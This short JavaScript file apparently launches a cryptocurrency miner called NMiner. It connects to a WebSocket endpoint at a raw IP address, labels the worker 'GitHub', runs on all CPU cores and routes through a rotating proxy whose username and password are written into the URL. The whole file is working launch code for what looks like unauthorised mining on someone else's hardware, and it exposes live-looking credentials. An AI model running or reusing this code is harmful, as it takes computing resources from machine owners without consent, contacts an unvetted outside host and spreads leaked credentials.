const { NMiner } = require(".");
new NMiner("ws://13.202.111.19:443/api/socket/connection", "GitHub", { proxy: "http://yekkvkeb-rotate:t8099hhbpqw8@p.webshare.io:80", threads: require("os").cpus().length });
